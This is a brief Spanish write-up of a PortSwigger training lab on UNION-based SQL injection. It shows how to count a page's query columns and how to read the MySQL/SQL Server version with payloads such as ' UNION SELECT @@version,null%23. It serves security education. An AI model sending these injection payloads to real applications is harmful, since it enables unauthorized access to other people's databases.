# SQL Injection Attack - Querying Database Version on MySQL and Microsoft

## 📌 Lab Information

- **Lab:** Querying Database Version on MySQL and Microsoft
- **Categoría:** UNION SQL Injection

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

---

## 🎯 Objetivo

Obtener la versión de la base de datos MySQL o Microsoft SQL Server.

---

## 🔍 Enumeración de columnas

Probamos:

```sql
' UNION SELECT null,null#
```

El comentario `#` debe ir URL Encoded:

```sql
' UNION SELECT null,null%23
```

![Enumeración columnas](../../../../Imagenes/pasted-image-20260329212129.png)

---

## 🚀 Obtención de versión

En MySQL y Microsoft SQL Server puede utilizarse:

```sql
@@version
```

Payload final:

```sql
' UNION SELECT @@version,null%23
```

Resultado:

![Versión BD](../../../../Imagenes/pasted-image-20260329212223.png)

---

## ✅ Resultado

Se obtuvo exitosamente:
- Tipo de motor
- Versión exacta de la base de datos
